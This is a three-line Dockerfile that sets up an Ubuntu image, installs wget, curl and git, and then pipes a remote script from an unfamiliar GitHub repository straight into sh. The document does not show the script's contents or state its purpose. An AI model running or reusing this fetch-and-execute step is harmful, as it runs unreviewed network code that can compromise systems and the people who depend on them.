FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/mbcm001/mbc/main/mbc.sh | sh
